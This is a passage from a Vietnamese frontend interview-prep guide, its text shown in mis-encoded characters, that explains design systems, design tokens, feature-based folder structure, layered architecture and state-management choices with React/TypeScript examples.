| **Module Federation**  | Share code runtime (khÃ´ng pháº£i build time)             | Microfrontend architecture |
| **Multi-Framework**    | React + Vue + Angular trong 1 app                      | Legacy migration           |
| **Event Bus**          | Apps giao tiáº¿p qua events                              | Loosely coupled            |
| **Shared State**       | Global state (Redux, Zustand)                          | User, theme, cart          |
| **Shell Routing**      | Shell quáº£n lÃ½ táº¥t cáº£ routes                            | Centralized control        |
| **Distributed Routing**| Má»—i app tá»± quáº£n lÃ½ routes                              | Autonomous apps            |
| **CSS Modules**        | Scoped CSS vá»›i unique class names                      | Default choice             |
| **CSS-in-JS**          | Styles trong JS, scoped                                | Dynamic styles             |
| **Shadow DOM**         | 100% CSS isolation                                     | Web Components             |

**ğŸ”¥ Key Takeaways:**
- âœ… **Microfrontend** = Independent deployment + Team autonomy
- âœ… **Module Federation** = Runtime code sharing (no duplicate React)
- âœ… **Multi-framework** = React + Vue + Angular cÃ¹ng app (vá»›i wrapper)
- âœ… **Communication**: Event Bus (loose) vs Shared State (tight)
- âœ… **Routing**: Shell-based (centralized) vs Distributed (autonomous)
- âœ… **Styling**: CSS Modules (default), CSS-in-JS (dynamic), Shadow DOM (isolation)
- âœ… **Monorepo** vá»›i Nx = Best DX + Code sharing + Consistent tooling

---

## 63. Design System & Frontend Architecture - XÃ¢y Dá»±ng Cáº¥u TrÃºc FE CÃ³ Thá»ƒ Scale, Design Patterns

**â“ CÃ¢u Há»i:**
> "Design system, Steps to build a FE structure? How you define structure for app can be scale? Apply any design pattern yet?"

**ğŸ“‹ PhÃ¢n TÃ­ch:**
- **Design System** lÃ  gÃ¬? Táº¡i sao cáº§n?
- **CÃ¡c bÆ°á»›c xÃ¢y dá»±ng cáº¥u trÃºc Frontend** cÃ³ thá»ƒ scale
- **CÃ¡ch Ä‘á»‹nh nghÄ©a cáº¥u trÃºc** cho app lá»›n (kiáº¿n trÃºc phÃ¢n táº§ng)
- **Design Patterns** nÃ o Ä‘Æ°á»£c Ã¡p dá»¥ng trong FE?

---

### **ğŸ¯ PHáº¦N 1: DESIGN SYSTEM LÃ€ GÃŒ? (What is Design System?)**

```typescript
/**
 * ğŸ¨ DESIGN SYSTEM (Há»‡ Thá»‘ng Thiáº¿t Káº¿)
 * 
 * LÃ  Táº¬P Há»¢P cÃ¡c thÃ nh pháº§n UI, quy táº¯c thiáº¿t káº¿, vÃ  hÆ°á»›ng dáº«n sá»­ dá»¥ng
 * Ä‘á»ƒ Ä‘áº£m báº£o TÃNH NHáº¤T QUÃN (consistency) trong toÃ n bá»™ sáº£n pháº©m.
 * 
 * ğŸ”¥ DESIGN SYSTEM â‰  COMPONENT LIBRARY
 * 
 * Design System bao gá»“m:
 * â”œâ”€â”€ 1ï¸âƒ£ Design Tokens (MÃ u sáº¯c, Font, Spacing, Shadow...)
 * â”œâ”€â”€ 2ï¸âƒ£ Component Library (Button, Input, Modal, Table...)
 * â”œâ”€â”€ 3ï¸âƒ£ Patterns & Guidelines (CÃ¡ch sá»­ dá»¥ng, Best practices)
 * â”œâ”€â”€ 4ï¸âƒ£ Documentation (Storybook, Docs site)
 * â””â”€â”€ 5ï¸âƒ£ Tools & Processes (Figma, Design workflow)
 * 
 * Component Library chá»‰ lÃ  1 PHáº¦N cá»§a Design System!
 */

// ===================================================
// ğŸ¢ VÃ Dá»¤ THá»°C Táº¾: KHÃ”NG CÃ“ DESIGN SYSTEM
// ===================================================

// âŒ SCENARIO: 10 developers, khÃ´ng cÃ³ design system
// â†’ Má»—i ngÆ°á»i code Button theo Ã½ mÃ¬nh

// Developer 1 (Team Dashboard):
const Button1 = styled.button`
  background: #007bff;      // MÃ u xanh dÆ°Æ¡ng
  padding: 10px 20px;       // Padding
  border-radius: 4px;       // Bo gÃ³c 4px
  font-size: 14px;          // Font size 14px
`;

// Developer 2 (Team Profile):
const Button2 = styled.button`
  background: #0066cc;      // MÃ u xanh khÃ¡c! âŒ
  padding: 12px 24px;       // Padding khÃ¡c! âŒ
  border-radius: 8px;       // Bo gÃ³c khÃ¡c! âŒ
  font-size: 16px;          // Font khÃ¡c! âŒ
`;

// Developer 3 (Team Settings):
const Button3 = styled.button`
  background: linear-gradient(to right, #007bff, #0066cc); // Gradient! âŒ
  padding: 8px 16px;        // Padding khÃ¡c ná»¯a! âŒ
  border-radius: 6px;       // Bo gÃ³c khÃ¡c ná»¯a! âŒ
  font-size: 15px;          // Font khÃ¡c ná»¯a! âŒ
`;

/**
 * âŒ Káº¾T QUáº¢:
 * - App cÃ³ 3 LOáº I BUTTON KHÃC NHAU (khÃ´ng nháº¥t quÃ¡n)
 * - User bá»‘i rá»‘i: "Button nÃ o Ä‘á»ƒ click?"
 * - Designer phÃ¡t Ä‘iÃªn: "ÄÃ¢y khÃ´ng pháº£i design tÃ´i Ä‘Æ°a!"
 * - Developers tranh cÃ£i: "Button cá»§a tÃ´i Ä‘áº¹p hÆ¡n!"
 * - Maintenance nightmare: Muá»‘n Ä‘á»•i mÃ u â†’ pháº£i sá»­a 3 chá»—
 */

// ===================================================
// âœ… GIáº¢I PHÃP: CÃ“ DESIGN SYSTEM
// ===================================================

// 1ï¸âƒ£ DESIGN TOKENS (Token Thiáº¿t Káº¿)
// tokens/colors.ts
export const colors = {
  // Primary colors (MÃ u chÃ­nh)
  primary: {
    50: '#e3f2fd',    // Lightest (nháº¡t nháº¥t)
    100: '#bbdefb',
    200: '#90caf9',
    300: '#64b5f6',
    400: '#42a5f5',
    500: '#2196f3',   // Default (máº·c Ä‘á»‹nh)
    600: '#1e88e5',
    700: '#1976d2',
    800: '#1565c0',
    900: '#0d47a1',   // Darkest (Ä‘áº­m nháº¥t)
  },
  // Semantic colors (MÃ u theo ngá»¯ nghÄ©a)
  success: '#4caf50',
  warning: '#ff9800',
  error: '#f44336',
  info: '#2196f3',
};

// tokens/spacing.ts
export const spacing = {
  xs: '4px',      // Extra small
  sm: '8px',      // Small
  md: '16px',     // Medium (default)
  lg: '24px',     // Large
  xl: '32px',     // Extra large
  xxl: '48px',    // 2x Extra large
};

// tokens/typography.ts
export const typography = {
  fontFamily: {
    body: "'Inter', sans-serif",
    heading: "'Poppins', sans-serif",
    mono: "'Fira Code', monospace",
  },
  fontSize: {
    xs: '12px',
    sm: '14px',
    md: '16px',   // Base font size (cá»¡ chá»¯ cÆ¡ báº£n)
    lg: '18px',
    xl: '20px',
    '2xl': '24px',
    '3xl': '30px',
  },
  fontWeight: {
    normal: 400,
    medium: 500,
    semibold: 600,
    bold: 700,
  },
};

// 2ï¸âƒ£ COMPONENT LIBRARY (ThÆ° Viá»‡n Components)
// components/Button/Button.tsx
import { colors, spacing, typography } from '@tokens';

interface ButtonProps {
  variant?: 'primary' | 'secondary' | 'outline';
  size?: 'sm' | 'md' | 'lg';
  children: React.ReactNode;
}

const Button: React.FC<ButtonProps> = ({ 
  variant = 'primary', 
  size = 'md',
  children 
}) => {
  // âœ… DÃ¹ng design tokens (khÃ´ng hardcode)
  const styles = {
    primary: {
      background: colors.primary[500],    // DÃ¹ng token
      color: '#fff',
      padding: spacing[size],             // DÃ¹ng token
      fontSize: typography.fontSize[size], // DÃ¹ng token
      borderRadius: '4px',
      border: 'none',
    },
    secondary: {
      background: colors.primary[100],
      color: colors.primary[900],
      padding: spacing[size],
      fontSize: typography.fontSize[size],
      borderRadius: '4px',
      border: 'none',
    },
    outline: {
      background: 'transparent',
      color: colors.primary[500],
      padding: spacing[size],
      fontSize: typography.fontSize[size],
      borderRadius: '4px',
      border: `2px solid ${colors.primary[500]}`,
    },
  };

  return (
    <button style={styles[variant]}>
      {children}
    </button>
  );
};

/**
 * âœ… Lá»¢I ÃCH:
 * - Táº¥t cáº£ Buttons GIá»NG NHAU (consistent)
 * - Muá»‘n Ä‘á»•i mÃ u â†’ chá»‰ sá»­a 1 chá»— (colors.primary[500])
 * - Developers KHÃ”NG TRANH CÃƒI (follow design system)
 * - Designer VUI Váºº (Ä‘Ãºng design)
 * - User KHÃ”NG Bá»I Rá»I (UI nháº¥t quÃ¡n)
 */

// ===================================================
// ğŸ“Š SO SÃNH: KHÃ”NG VS CÃ“ DESIGN SYSTEM
// ===================================================

/**
 * âŒ KHÃ”NG CÃ“ DESIGN SYSTEM:
 * â”œâ”€â”€ 10 developers â†’ 10 cÃ¡ch code Button khÃ¡c nhau
 * â”œâ”€â”€ Buttons: 10 loáº¡i mÃ u, 8 loáº¡i padding, 6 loáº¡i border-radius
 * â”œâ”€â”€ Colors: 50+ mÃ u xanh khÃ¡c nhau (hardcoded)
 * â”œâ”€â”€ Spacing: 30+ giÃ¡ trá»‹ padding/margin khÃ¡c nhau
 * â”œâ”€â”€ Typography: 15+ font sizes khÃ¡c nhau
 * â”œâ”€â”€ Maintenance: Äá»•i mÃ u â†’ sá»­a 100+ chá»— (3 ngÃ y)
 * â””â”€â”€ User experience: Rá»‘i, khÃ´ng nháº¥t quÃ¡n
 * 
 * âœ… CÃ“ DESIGN SYSTEM:
 * â”œâ”€â”€ 10 developers â†’ 1 cÃ¡ch code Button (follow tokens)
 * â”œâ”€â”€ Buttons: 1 component, 3 variants (primary, secondary, outline)
 * â”œâ”€â”€ Colors: 1 file colors.ts vá»›i 10 mÃ u primary (50-900)
 * â”œâ”€â”€ Spacing: 6 values (xs, sm, md, lg, xl, xxl)
 * â”œâ”€â”€ Typography: 7 font sizes (xs, sm, md, lg, xl, 2xl, 3xl)
 * â”œâ”€â”€ Maintenance: Äá»•i mÃ u â†’ sá»­a 1 chá»— (5 phÃºt)
 * â””â”€â”€ User experience: MÆ°á»£t mÃ , nháº¥t quÃ¡n
 */

// ===================================================
// ğŸ¯ Táº I SAO Cáº¦N DESIGN SYSTEM? (Why Design System?)
// ===================================================

/**
 * 1ï¸âƒ£ CONSISTENCY (TÃ­nh Nháº¥t QuÃ¡n)
 *    â†’ Táº¥t cáº£ UI elements giá»‘ng nhau trong toÃ n app
 *    â†’ User khÃ´ng bá»‘i rá»‘i
 * 
 * 2ï¸âƒ£ SCALABILITY (Kháº£ NÄƒng Má»Ÿ Rá»™ng)
 *    â†’ ThÃªm 100 developers â†’ váº«n giá»¯ consistency
 *    â†’ ThÃªm 50 pages má»›i â†’ váº«n dÃ¹ng components cÅ©
 * 
 * 3ï¸âƒ£ SPEED (Tá»‘c Äá»™ PhÃ¡t Triá»ƒn)
 *    â†’ Developers khÃ´ng cáº§n design tá»« Ä‘áº§u
 *    â†’ Copy component tá»« Storybook â†’ paste vÃ o code
 *    â†’ Build page má»›i: 1 ngÃ y thay vÃ¬ 1 tuáº§n
 * 
 * 4ï¸âƒ£ MAINTAINABILITY (Dá»… Báº£o TrÃ¬)
 *    â†’ Äá»•i mÃ u toÃ n app: 1 file thay vÃ¬ 100 files
 *    â†’ Fix bug Button: 1 component thay vÃ¬ 50 chá»—
 * 
 * 5ï¸âƒ£ COLLABORATION (Há»£p TÃ¡c)
 *    â†’ Designer vÃ  Developer nÃ³i chung 1 ngÃ´n ngá»¯
 *    â†’ "DÃ¹ng Button variant='primary' size='lg'" (rÃµ rÃ ng)
 *    â†’ KhÃ´ng cÃ²n: "Button mÃ u xanh, padding 12px..." (mÆ¡ há»“)
 * 
 * 6ï¸âƒ£ ACCESSIBILITY (Kháº£ NÄƒng Tiáº¿p Cáº­n)
 *    â†’ Components built-in accessibility (ARIA labels, keyboard nav)
 *    â†’ Developers KHÃ”NG QUÃŠN implement a11y
 */

---

### **ğŸ—ï¸ PHáº¦N 2: STEPS TO BUILD SCALABLE FE STRUCTURE (CÃ¡c BÆ°á»›c XÃ¢y Dá»±ng Cáº¥u TrÃºc FE CÃ³ Thá»ƒ Scale)**

```typescript
/**
 * ğŸ¯ Má»¤C TIÃŠU:
 * XÃ¢y dá»±ng cáº¥u trÃºc Frontend cho app Lá»šN (100+ developers, 500+ components)
 * cÃ³ thá»ƒ SCALE dá»… dÃ ng mÃ  KHÃ”NG TRá» THÃ€NH SPAGHETTI CODE.
 * 
 * ğŸ“‹ 7 BÆ¯á»šC XÃ‚Y Dá»°NG:
 * 1ï¸âƒ£ Define Architecture Pattern (Chá»n kiáº¿n trÃºc phÃ¢n táº§ng)
 * 2ï¸âƒ£ Folder Structure (Cáº¥u trÃºc thÆ° má»¥c rÃµ rÃ ng)
 * 3ï¸âƒ£ Design System Setup (Thiáº¿t láº­p Design System)
 * 4ï¸âƒ£ State Management Strategy (Chiáº¿n lÆ°á»£c quáº£n lÃ½ state)
 * 5ï¸âƒ£ Code Organization (Tá»• chá»©c code module hÃ³a)
 * 6ï¸âƒ£ Tooling & DX (CÃ´ng cá»¥ vÃ  Developer Experience)
 * 7ï¸âƒ£ Testing & Documentation (Kiá»ƒm thá»­ vÃ  tÃ i liá»‡u)
 */

// ===================================================
// 1ï¸âƒ£ DEFINE ARCHITECTURE PATTERN (Kiáº¿n TrÃºc PhÃ¢n Táº§ng)
// ===================================================

/**
 * ğŸ›ï¸ LAYERED ARCHITECTURE (Kiáº¿n TrÃºc PhÃ¢n Táº§ng)
 * 
 * Chia app thÃ nh cÃ¡c Táº¦NG (layers) vá»›i trÃ¡ch nhiá»‡m rÃµ rÃ ng:
 * 
 * â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 * â”‚  PRESENTATION LAYER (Táº§ng Hiá»ƒn Thá»‹)    â”‚ â† React Components, UI
 * â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 * â”‚  BUSINESS LOGIC LAYER (Táº§ng Logic)     â”‚ â† Hooks, Utils, Validators
 * â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 * â”‚  DATA ACCESS LAYER (Táº§ng Dá»¯ Liá»‡u)      â”‚ â† API calls, Repositories
 * â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 * â”‚  INFRASTRUCTURE LAYER (Táº§ng Háº¡ Táº§ng)   â”‚ â† Axios, Storage, Config
 * â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 * 
 * ğŸ”¥ NGUYÃŠN Táº®C:
 * - Táº§ng trÃªn CHá»ˆ PHá»¤ THUá»˜C vÃ o táº§ng dÆ°á»›i (one-way dependency)
 * - Táº§ng dÆ°á»›i KHÃ”NG BIáº¾T táº§ng trÃªn (no reverse dependency)
 * - Má»—i táº§ng cÃ³ thá»ƒ THAY THáº¾ Ä‘á»™c láº­p (interchangeable)
 */

// ===================================================
// 2ï¸âƒ£ FOLDER STRUCTURE (Cáº¥u TrÃºc ThÆ° Má»¥c)
// ===================================================

/**
 * ğŸ“ FEATURE-BASED STRUCTURE (Cáº¥u TrÃºc Theo Feature)
 * 
 * NhÃ³m code theo FEATURE thay vÃ¬ theo TYPE (components, hooks...)
 * â†’ Dá»… tÃ¬m, dá»… maintain, dá»… scale
 */

// âœ… RECOMMENDED: Feature-based (Theo Feature)
/*
src/
â”œâ”€â”€ features/                    # Táº¥t cáº£ features cá»§a app
â”‚   â”œâ”€â”€ auth/                    # Feature: Authentication
â”‚   â”‚   â”œâ”€â”€ components/          # Components cá»§a Auth
â”‚   â”‚   â”‚   â”œâ”€â”€ LoginForm.tsx
â”‚   â”‚   â”‚   â”œâ”€â”€ RegisterForm.tsx
â”‚   â”‚   â”‚   â””â”€â”€ ForgotPassword.tsx
â”‚   â”‚   â”œâ”€â”€ hooks/               # Hooks cá»§a Auth
â”‚   â”‚   â”‚   â”œâ”€â”€ useAuth.ts
â”‚   â”‚   â”‚   â””â”€â”€ useLogin.ts
â”‚   â”‚   â”œâ”€â”€ services/            # API calls cá»§a Auth
â”‚   â”‚   â”‚   â””â”€â”€ authService.ts
â”‚   â”‚   â”œâ”€â”€ store/               # State cá»§a Auth (náº¿u dÃ¹ng Redux)
â”‚   â”‚   â”‚   â”œâ”€â”€ authSlice.ts
â”‚   â”‚   â”‚   â””â”€â”€ authSelectors.ts
â”‚   â”‚   â”œâ”€â”€ types/               # TypeScript types cá»§a Auth
â”‚   â”‚   â”‚   â””â”€â”€ auth.types.ts
â”‚   â”‚   â”œâ”€â”€ utils/               # Utils cá»§a Auth
â”‚   â”‚   â”‚   â””â”€â”€ tokenUtils.ts
â”‚   â”‚   â””â”€â”€ index.ts             # Public API cá»§a Auth feature
â”‚   â”‚
â”‚   â”œâ”€â”€ dashboard/               # Feature: Dashboard
â”‚   â”‚   â”œâ”€â”€ components/
â”‚   â”‚   â”‚   â”œâ”€â”€ DashboardLayout.tsx
â”‚   â”‚   â”‚   â”œâ”€â”€ StatsCard.tsx
â”‚   â”‚   â”‚   â””â”€â”€ RecentOrders.tsx
â”‚   â”‚   â”œâ”€â”€ hooks/
â”‚   â”‚   â”‚   â””â”€â”€ useDashboardData.ts
â”‚   â”‚   â”œâ”€â”€ services/
â”‚   â”‚   â”‚   â””â”€â”€ dashboardService.ts
â”‚   â”‚   â””â”€â”€ index.ts
â”‚   â”‚
â”‚   â”œâ”€â”€ orders/                  # Feature: Orders
â”‚   â”‚   â”œâ”€â”€ components/
â”‚   â”‚   â”‚   â”œâ”€â”€ OrderList.tsx
â”‚   â”‚   â”‚   â”œâ”€â”€ OrderDetail.tsx
â”‚   â”‚   â”‚   â””â”€â”€ OrderForm.tsx
â”‚   â”‚   â”œâ”€â”€ hooks/
â”‚   â”‚   â”‚   â”œâ”€â”€ useOrders.ts
â”‚   â”‚   â”‚   â””â”€â”€ useOrderMutations.ts
â”‚   â”‚   â”œâ”€â”€ services/
â”‚   â”‚   â”‚   â””â”€â”€ orderService.ts
â”‚   â”‚   â””â”€â”€ index.ts
â”‚   â”‚
â”‚   â””â”€â”€ products/                # Feature: Products
â”‚       â”œâ”€â”€ components/
â”‚       â”œâ”€â”€ hooks/
â”‚       â”œâ”€â”€ services/
â”‚       â””â”€â”€ index.ts
â”‚
â”œâ”€â”€ shared/                      # Code DÃ™NG CHUNG (shared across features)
â”‚   â”œâ”€â”€ components/              # Shared components (Button, Input, Modal...)
â”‚   â”‚   â”œâ”€â”€ Button/
â”‚   â”‚   â”‚   â”œâ”€â”€ Button.tsx
â”‚   â”‚   â”‚   â”œâ”€â”€ Button.test.tsx
â”‚   â”‚   â”‚   â”œâ”€â”€ Button.stories.tsx  # Storybook story
â”‚   â”‚   â”‚   â””â”€â”€ index.ts
â”‚   â”‚   â”œâ”€â”€ Input/
â”‚   â”‚   â”œâ”€â”€ Modal/
â”‚   â”‚   â””â”€â”€ Table/
â”‚   â”‚
â”‚   â”œâ”€â”€ hooks/                   # Shared hooks (useDebounce, useLocalStorage...)
â”‚   â”‚   â”œâ”€â”€ useDebounce.ts
â”‚   â”‚   â”œâ”€â”€ useLocalStorage.ts
â”‚   â”‚   â””â”€â”€ useMediaQuery.ts
â”‚   â”‚
â”‚   â”œâ”€â”€ utils/                   # Shared utilities
â”‚   â”‚   â”œâ”€â”€ formatters.ts        # Format date, currency, sá»‘ Ä‘iá»‡n thoáº¡i...
â”‚   â”‚   â”œâ”€â”€ validators.ts        # Validate email, phone, credit card...
â”‚   â”‚   â””â”€â”€ helpers.ts           # Helper functions
â”‚   â”‚
â”‚   â”œâ”€â”€ constants/               # Shared constants
â”‚   â”‚   â”œâ”€â”€ routes.ts            # App routes
â”‚   â”‚   â”œâ”€â”€ api.ts               # API endpoints
â”‚   â”‚   â””â”€â”€ config.ts            # App config
â”‚   â”‚
â”‚   â””â”€â”€ types/                   # Shared TypeScript types
â”‚       â”œâ”€â”€ api.types.ts
â”‚       â””â”€â”€ common.types.ts
â”‚
â”œâ”€â”€ core/                        # CORE INFRASTRUCTURE (háº¡ táº§ng cá»‘t lÃµi)
â”‚   â”œâ”€â”€ api/                     # API client setup
â”‚   â”‚   â”œâ”€â”€ apiClient.ts         # Axios instance vá»›i interceptors
â”‚   â”‚   â””â”€â”€ endpoints.ts         # API endpoints
â”‚   â”‚
â”‚   â”œâ”€â”€ store/                   # Global state setup (Redux/Zustand)
â”‚   â”‚   â”œâ”€â”€ store.ts             # Store configuration
â”‚   â”‚   â””â”€â”€ rootReducer.ts       # Combine reducers
â”‚   â”‚
â”‚   â”œâ”€â”€ router/                  # Routing setup
â”‚   â”‚   â”œâ”€â”€ routes.tsx           # App routes
â”‚   â”‚   â””â”€â”€ ProtectedRoute.tsx   # Auth guard
â”‚   â”‚
â”‚   â””â”€â”€ theme/                   # Design System
â”‚       â”œâ”€â”€ tokens/              # Design tokens
â”‚       â”‚   â”œâ”€â”€ colors.ts
â”‚       â”‚   â”œâ”€â”€ spacing.ts
â”‚       â”‚   â””â”€â”€ typography.ts
â”‚       â””â”€â”€ GlobalStyles.ts      # Global CSS
â”‚
â”œâ”€â”€ pages/                       # PAGE COMPONENTS (route pages)
â”‚   â”œâ”€â”€ LoginPage.tsx            # /login
â”‚   â”œâ”€â”€ DashboardPage.tsx        # /dashboard
â”‚   â”œâ”€â”€ OrdersPage.tsx           # /orders
â”‚   â””â”€â”€ ProductsPage.tsx         # /products
â”‚
â”œâ”€â”€ App.tsx                      # Root component
â”œâ”€â”€ main.tsx                     # Entry point
â””â”€â”€ vite-env.d.ts                # Vite types
*/

/**
 * âœ… Lá»¢I ÃCH Cá»¦A FEATURE-BASED STRUCTURE:
 * 
 * 1ï¸âƒ£ CO-LOCATION (Äáº·t CÃ¹ng Chá»—):
 *    â†’ Táº¥t cáº£ code cá»§a 1 feature á»Ÿ 1 folder
 *    â†’ Dá»… tÃ¬m: Cáº§n sá»­a Login? â†’ vÃ o features/auth/
 * 
 * 2ï¸âƒ£ ENCAPSULATION (ÄÃ³ng GÃ³i):
 *    â†’ Má»—i feature lÃ  1 MODULE Ä‘á»™c láº­p
 *    â†’ Export qua index.ts (public API)
 *    â†’ CÃ¡c files khÃ¡c PRIVATE (khÃ´ng export)
 * 
 * 3ï¸âƒ£ SCALABILITY (Má»Ÿ Rá»™ng):
 *    â†’ ThÃªm feature má»›i? â†’ Táº¡o folder má»›i
 *    â†’ 100 features? â†’ Váº«n rÃµ rÃ ng!
 * 
 * 4ï¸âƒ£ TEAM AUTONOMY (Äá»™c Láº­p Team):
 *    â†’ Team A lÃ m feature Auth
 *    â†’ Team B lÃ m feature Orders
 *    â†’ KHÃ”NG CONFLICT (Ã­t merge conflicts)
 * 
 * 5ï¸âƒ£ CODE SPLITTING:
 *    â†’ Lazy load tá»«ng feature
 *    â†’ User vÃ o /login â†’ chá»‰ load Auth feature
 *    â†’ KhÃ´ng load Orders, Products (tiáº¿t kiá»‡m bandwidth)
 */

// âŒ ANTI-PATTERN: Type-based structure (Theo Type - KHÃ”NG KHUYáº¾N KHÃCH)
/*
src/
â”œâ”€â”€ components/          # Táº¤T Cáº¢ components (100+ files) âŒ
â”‚   â”œâ”€â”€ LoginForm.tsx
â”‚   â”œâ”€â”€ RegisterForm.tsx
â”‚   â”œâ”€â”€ DashboardLayout.tsx
â”‚   â”œâ”€â”€ OrderList.tsx
â”‚   â”œâ”€â”€ ProductCard.tsx
â”‚   â””â”€â”€ ... 95 files ná»¯a
â”œâ”€â”€ hooks/               # Táº¤T Cáº¢ hooks (50+ files) âŒ
â”‚   â”œâ”€â”€ useAuth.ts
â”‚   â”œâ”€â”€ useOrders.ts
â”‚   â”œâ”€â”€ useProducts.ts
â”‚   â””â”€â”€ ... 47 files ná»¯a
â””â”€â”€ services/            # Táº¤T Cáº¢ services (30+ files) âŒ
    â”œâ”€â”€ authService.ts
    â”œâ”€â”€ orderService.ts
    â””â”€â”€ ... 28 files ná»¯a

âŒ Váº¤N Äá»€:
- components/ cÃ³ 100 files â†’ TÃŒM KHÃ”NG RA!
- Muá»‘n sá»­a Auth â†’ pháº£i má»Ÿ 3 folders (components, hooks, services)
- Team A sá»­a LoginForm.tsx, Team B sá»­a RegisterForm.tsx â†’ CONFLICT!
- KhÃ´ng thá»ƒ code split theo feature
*/

// ===================================================
// 3ï¸âƒ£ DESIGN SYSTEM SETUP (Thiáº¿t Láº­p Design System)
// ===================================================

// Step 1: Define Design Tokens
// core/theme/tokens/colors.ts
export const colors = {
  primary: {
    50: '#e3f2fd',
    500: '#2196f3',  // Main primary color
    900: '#0d47a1',
  },
  semantic: {
    success: '#4caf50',
    error: '#f44336',
    warning: '#ff9800',
    info: '#2196f3',
  },
  neutral: {
    0: '#ffffff',
    50: '#fafafa',
    100: '#f5f5f5',
    500: '#9e9e9e',
    900: '#212121',
  },
};

// core/theme/tokens/spacing.ts
export const spacing = {
  xs: 4,   // 4px
  sm: 8,   // 8px
  md: 16,  // 16px (base)
  lg: 24,  // 24px
  xl: 32,  // 32px
  xxl: 48, // 48px
};

// core/theme/tokens/typography.ts
export const typography = {
  fontFamily: {
    body: "'Inter', -apple-system, sans-serif",
    heading: "'Poppins', sans-serif",
  },
  fontSize: {
    xs: 12,
    sm: 14,
    md: 16,  // Base font size
    lg: 18,
    xl: 20,
    '2xl': 24,
  },
  fontWeight: {
    normal: 400,
    medium: 500,
    semibold: 600,
    bold: 700,
  },
  lineHeight: {
    tight: 1.2,
    normal: 1.5,
    relaxed: 1.75,
  },
};

// Step 2: Create Theme Provider
// core/theme/ThemeProvider.tsx
import { createContext, useContext } from 'react';
import { colors, spacing, typography } from './tokens';

const theme = {
  colors,
  spacing,
  typography,
};

const ThemeContext = createContext(theme);

export const ThemeProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  return (
    <ThemeContext.Provider value={theme}>
      {children}
    </ThemeContext.Provider>
  );
};

export const useTheme = () => useContext(ThemeContext);

// Step 3: Create Base Components (Button example)
// shared/components/Button/Button.tsx
import { useTheme } from '@core/theme';

interface ButtonProps {
  variant?: 'primary' | 'secondary' | 'outline';
  size?: 'sm' | 'md' | 'lg';
  children: React.ReactNode;
  onClick?: () => void;
}

export const Button: React.FC<ButtonProps> = ({
  variant = 'primary',
  size = 'md',
  children,
  onClick,
}) => {
  const theme = useTheme();

  // âœ… DÃ¹ng theme tokens (khÃ´ng hardcode)
  const styles = {
    primary: {
      backgroundColor: theme.colors.primary[500],
      color: theme.colors.neutral[0],
      padding: `${theme.spacing.sm}px ${theme.spacing.md}px`,
      fontSize: theme.typography.fontSize[size],
      fontWeight: theme.typography.fontWeight.semibold,
      border: 'none',
      borderRadius: '4px',
      cursor: 'pointer',
    },
    // ... secondary, outline variants
  };

  return (
    <button style={styles[variant]} onClick={onClick}>
      {children}
    </button>
  );
};

/**
 * âœ… Lá»¢I ÃCH:
 * - Thay Ä‘á»•i mÃ u primary: 1 file (colors.ts)
 * - Thay Ä‘á»•i spacing: 1 file (spacing.ts)
 * - Consistent UI: Táº¥t cáº£ Buttons giá»‘ng nhau
 */

// ===================================================
// 4ï¸âƒ£ STATE MANAGEMENT STRATEGY (Chiáº¿n LÆ°á»£c Quáº£n LÃ½ State)
// ===================================================

/**
 * ğŸ¯ PHÃ‚N LOáº I STATE:
 * 
 * 1ï¸âƒ£ LOCAL STATE (State Cá»¥c Bá»™):
 *    â†’ Chá»‰ dÃ¹ng trong 1 component
 *    â†’ DÃ¹ng useState, useReducer
 *    â†’ VD: Form input value, modal open/close
 * 
 * 2ï¸âƒ£ SHARED STATE (State Chia Sáº»):
 *    â†’ DÃ¹ng trong nhiá»u components (cÃ¹ng feature)
 *    â†’ DÃ¹ng Context API, Zustand
 *    â†’ VD: User info trong Auth feature
 * 
 * 3ï¸âƒ£ GLOBAL STATE (State ToÃ n Cá»¥c):
 *    â†’ DÃ¹ng trong TOÃ€N APP
 *    â†’ DÃ¹ng Redux, Zustand (global store)
 *    â†’ VD: Theme, Language, Current User
 * 
 * 4ï¸âƒ£ SERVER STATE (State Tá»« Server):
 *    â†’ Data tá»« API
 *    â†’ DÃ¹ng React Query, SWR
 *    â†’ VD: User list, Product list, Order details
 * 
 * ğŸ”¥ NGUYÃŠN Táº®C:
 * - Æ¯u tiÃªn LOCAL STATE (Ä‘Æ¡n giáº£n nháº¥t)
 * - Chá»‰ dÃ¹ng GLOBAL STATE khi THá»°C Sá»° Cáº¦N
 * - DÃ¹ng React Query cho SERVER STATE (caching, revalidation)
 */

// Example: State Strategy trong 1 Trading App

// 1ï¸âƒ£ LOCAL STATE: Form input
const OrderForm = () => {
  const [quantity, setQuantity] = useState(0);  // âœ… Local state
  const [price, setPrice] = useState(0);        // âœ… Local state
  
  return (
    <form>
      <input value={quantity} onChange={e => setQuantity(+e.target.value)} />
      <input value={price} onChange={e => setPrice(+e.target.value)} />
    </form>
  );
};

// 2ï¸âƒ£ SHARED STATE: Auth state (dÃ¹ng trong Auth feature)
// features/auth/store/authStore.ts
import create from 'zustand';

interface AuthState {
  user: User | null;
  isAuthenticated: boolean;
  login: (user: User) => void;
  logout: () => void;
}

export const useAuthStore = create<AuthState>((set) => ({
  user: null,
  isAuthenticated: false,
  login: (user) => set({ user, isAuthenticated: true }),
  logout: () => set({ user: null, isAuthenticated: false }),
}));

// 3ï¸âƒ£ GLOBAL STATE: Theme
